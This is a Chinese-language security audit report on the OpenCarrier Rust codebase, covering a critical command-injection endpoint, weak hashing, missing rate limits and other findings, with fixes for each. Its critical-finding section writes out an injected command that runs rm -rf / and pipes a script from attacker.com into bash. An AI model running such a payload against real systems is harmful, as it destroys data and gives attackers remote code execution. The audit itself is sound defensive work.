# OpenCarrier 安全审计报告

**审计日期**: 2026-03-24
**审计范围**: 全代码库 (14 crates)
**审计工具**: 人工代码审查 + 静态分析

---

## 目录

1. [执行摘要](#执行摘要)
2. [审计方法论](#审计方法论)
3. [发现详情](#发现详情)
4. [安全亮点](#安全亮点)
5. [整改计划](#整改计划)
6. [附录](#附录)

---

## 执行摘要

### 总体评估

| 指标 | 评分 |
|------|------|
| 安全态势 | ⭐⭐⭐⭐ (良好) |
| 代码质量 | ⭐⭐⭐⭐ (良好) |
| 测试覆盖 | ⭐⭐⭐⭐ (良好) |
| 文档完整性 | ⭐⭐⭐ (中等) |

### 问题统计

| 严重程度 | 数量 | 状态 |
|----------|------|------|
| 🔴 Critical | 1 | 待修复 |
| 🟠 High | 3 | 待修复 |
| 🟡 Medium | 5 | 待修复 |
| 🟢 Low | 4 | 待改进 |
| **总计** | **13** | - |

---

## 审计方法论

本次审计涵盖以下维度：

1. **安全性审计** - OWASP Top 10、加密实现、输入验证
2. **代码质量审计** - 错误处理、代码重复、命名规范
3. **架构审计** - 模块依赖、API 设计、配置管理
4. **性能审计** - 内存泄漏、不必要的克隆、异步效率
5. **测试覆盖审计** - 单元测试、集成测试、边缘情况

### 重点审计模块

- `crates/opencarrier-kernel/` - 核心内核
- `crates/opencarrier-api/` - API 层
- `crates/opencarrier-cli/src/serve.rs` - 服务模式
- `crates/opencarrier-types/src/yinghe.rs` - 协议类型
- `crates/ying-relay/` - 中继模块
- `crates/opencarrier-skills/` - 技能系统

---

## 发现详情

### 🔴 CRITICAL-001: 命令注入风险

**文件**: `crates/opencarrier-api/src/routes.rs`
**行号**: 4180-4236
**风险等级**: Critical
**CVSS 评分**: 9.8 (Critical)
> **Note**: The `hands` feature has been removed. This endpoint no longer exists.

#### 问题描述

`/api/hands/install-depend` 端点直接使用 `sh -c` (Unix) 或 `cmd /C` (Windows) 执行用户提供的命令，且无认证机制。攻击者可构造恶意命令执行任意代码。

```rust
// 当前实现 (有风险)
let final_cmd = if cfg!(windows) {
    format!("cmd /C {}", cmd)
} else {
    format!("sh -c \"{}\"", cmd)
};
Command::new("sh").arg("-c").arg(&cmd).output()
```

#### 攻击向量

```bash
# 恶意请求示例
curl -X POST http://target:4200/api/hands/install-depend \
  -d '{"command": "rm -rf / && curl attacker.com/shell.sh | bash"}'
```

#### 影响

- 远程代码执行 (RCE)
- 系统完全沦陷
- 数据泄露/删除

#### 修复建议

1. **短期修复**: 添加用户认证
2. **中期修复**: 使用 `shlex` 转义命令参数
3. **长期修复**: 实施命令白名单机制

```rust
// 推荐实现
use shlex;

fn safe_execute(cmd: &str) -> Result<Output, Error> {
    // 1. 验证认证
    require_auth()?;

    // 2. 解析并转义命令
    let args = shlex::split(cmd).ok_or(Error::InvalidCommand)?;

    // 3. 检查白名单
    let allowed_commands = ["apt-get", "yum", "brew", "winget"];
    if !allowed_commands.contains(&args[0].as_str()) {
        return Err(Error::CommandNotAllowed);
    }

    // 4. 执行
    Command::new(&args[0])
        .args(&args[1..])
        .output()
        .map_err(Into::into)
}
```

---

### 🟠 HIGH-001: 缺少速率限制

**文件**: `crates/opencarrier-api/src/routes.rs`
**行号**: 全局
**风险等级**: High
**CVSS 评分**: 7.5 (High)

#### 问题描述

`/api/hands/install-depend` 等敏感端点缺少速率限制（hands 已移除），可被用于：
- 拒绝服务攻击 (DoS)
- 暴力破解
- 资源耗尽

#### 修复建议

```rust
use governor::{Quota, RateLimiter};

// 每分钟最多 10 次请求
let limiter = RateLimiter::direct(Quota::per_minute(10));

async fn install_dependency() -> Result<Json<Response>, Error> {
    if limiter.check().is_err() {
        return Err(Error::RateLimited);
    }
    // ... 继续处理
}
```

---

### 🟠 HIGH-002: 弱密码哈希算法

**文件**: 多处认证相关代码
**风险等级**: High
**CVSS 评分**: 6.5 (Medium-High)

#### 问题描述

密码/密钥处理使用 SHA256，而非专门设计的密钥派生函数。SHA256 设计目标是速度，不抗暴力破解。

#### 修复建议

```rust
use argon2::{self, Config};

fn hash_password(password: &str, salt: &[u8]) -> Result<String, Error> {
    let config = Config {
        variant: argon2::Variant::Argon2id,
        mem_cost: 65536,      // 64 MB
        time_cost: 3,          // 3 iterations
        lanes: 4,
        ..Default::default()
    };
    argon2::hash_encoded(password.as_bytes(), salt, &config)
}
```

---

### 🟠 HIGH-003: 依赖自动安装绕过

**文件**: `crates/opencarrier-api/src/routes.rs`
**行号**: 4180-4229
**风险等级**: High
**CVSS 评分**: 8.1 (High)

#### 问题描述

依赖自动安装流程可绕过用户确认，直接在系统上执行命令。

#### 修复建议

1. 添加显式用户确认步骤
2. 记录所有安装命令到审计日志
3. 限制可安装的包来源

---

### 🟡 MEDIUM-001: 不必要的 .clone() 调用

**文件**: 多处
**影响**: 性能下降，内存占用增加

#### 示例位置

- `kernel.rs`: 频繁克隆 `AgentManifest`
- `serve.rs`: 克隆 `AppState` 组件
- `routes.rs`: 克隆请求体

#### 修复建议

使用 `Arc<T>` 或引用替代不必要的克隆。

---

### 🟡 MEDIUM-002: .unwrap() 滥用

**文件**: 多处
**影响**: 可能导致运行时 panic

#### 修复建议

将 `.unwrap()` 替换为 `?` 操作符或 `.unwrap_or_default()`。

---

### 🟡 MEDIUM-003: ZIP 路径遍历

**文件**: `crates/opencarrier-skills/src/clawhub.rs`
**行号**: 549-552
**状态**: 已有防护，需确认完整性

#### 当前实现

```rust
let Some(enclosed_name) = file.enclosed_name() else {
    warn!("Skipping zip entry with unsafe path");
    continue;
};
```

`enclosed_name()` 方法已提供路径遍历防护，但建议添加额外检查：

```rust
// 额外验证
let path_str = enclosed_name.to_string_lossy();
if path_str.contains("..") || path_str.starts_with('/') {
    warn!("Skipping suspicious path: {}", path_str);
    continue;
}
```

---

### 🟡 MEDIUM-004: 凭证明文存储

**文件**: 配置文件 (`~/.opencarrier/config.toml`)
**影响**: 本地提权风险

#### 修复建议

1. 使用操作系统密钥链 (keyring)
2. 环境变量优先
3. 配置文件加密

---

### 🟡 MEDIUM-005: ECDH 密钥验证不严格

**文件**: `crates/ying-relay/src/auth.rs`
**行号**: 88

#### 修复建议

添加密钥长度严格验证：

```rust
fn validate_ecdh_key(key: &[u8]) -> Result<SecretKey, Error> {
    if key.len() != 32 {
        return Err(Error::InvalidKeyLength);
    }
    SecretKey::from_slice(key).map_err(|_| Error::InvalidKey)
}
```

---

### 🟢 LOW-001: 文档不完整

部分公开 API 缺少文档注释。

---

### 🟢 LOW-002: 测试覆盖

部分边缘情况未覆盖测试。

---

### 🟢 LOW-003: 日志敏感信息

某些错误日志可能泄露敏感数据。建议在生产环境禁用详细日志。

---

### 🟢 LOW-004: GitHub Actions Node.js 弃用

Node.js 20 将在 2026-06-02 强制升级到 Node.js 24。

---

## 安全亮点

### 加密实现 (优秀)

| 组件 | 实现 | 评估 |
|------|------|------|
| 非对称加密 | ECDH P-256 | ✅ 安全 |
| 对称加密 | AES-256-GCM | ✅ 安全 |
| 签名 | Ed25519 | ✅ 安全 |
| 会话令牌 | HMAC-SHA256 | ✅ 安全 |
| IV 生成 | 12字节随机 (OsRng) | ✅ 防重放 |

### 输入验证 (良好)

- ✅ ZIP 提取使用 `enclosed_name()` 防止路径遍历
- ✅ Prompt 注入扫描
- ✅ 危险能力检测
- ✅ 清单安全扫描

### 安全头 (良好)

- ✅ Content-Security-Policy
- ✅ HSTS
- ✅ CORS 配置
- ✅ 会话认证带时间戳验证

---

## 整改计划

### 阶段 1: 紧急修复 (1-3 天)

| 任务 | 优先级 | 负责人 | 状态 |
|------|--------|--------|------|
| 修复 CRITICAL-001 命令注入 | P0 | - | 🔴 待开始 |
| 添加认证中间件 | P0 | - | 🔴 待开始 |

### 阶段 2: 高优先级修复 (1 周)

| 任务 | 优先级 | 负责人 | 状态 |
|------|--------|--------|------|
| 实施速率限制 | P1 | - | 🔴 待开始 |
| 升级密码哈希到 Argon2 | P1 | - | 🔴 待开始 |
| 添加命令白名单 | P1 | - | 🔴 待开始 |

### 阶段 3: 中等优先级修复 (2 周)

| 任务 | 优先级 | 负责人 | 状态 |
|------|--------|--------|------|
| 减少 .clone() 调用 | P2 | - | 🔴 待开始 |
| 替换 .unwrap() 为 ? | P2 | - | 🔴 待开始 |
| 增强 ZIP 路径验证 | P2 | - | 🔴 待开始 |
| 添加凭据加密 | P2 | - | 🔴 待开始 |

### 阶段 4: 低优先级改进 (持续)

| 任务 | 优先级 | 负责人 | 状态 |
|------|--------|--------|------|
| 完善文档 | P3 | - | 🔴 待开始 |
| 增加测试覆盖 | P3 | - | 🔴 待开始 |
| 清理敏感日志 | P3 | - | 🔴 待开始 |
| 升级 GitHub Actions | P3 | - | 🔴 待开始 |

---

## 附录

### A. 审计检查清单

- [x] OWASP Top 10 检查
- [x] 加密实现审查
- [x] 输入验证审查
- [x] 认证授权审查
- [x] 错误处理审查
- [x] 日志安全审查
- [x] 依赖安全审查
- [x] 配置安全审查

### B. 参考资料

- [OWASP Top 10 2021](https://owasp.org/Top10/)
- [Rust Security Guidelines](https://anssi-fr.github.io/rust-guide/)
- [NIST Cryptographic Standards](https://csrc.nist.gov/publications/detail/sp/800-175b/rev-1/final)

### C. 联系信息

如有安全问题报告，请联系: security@opencarrier.dev

---

**报告版本**: 1.0
**最后更新**: 2026-03-24
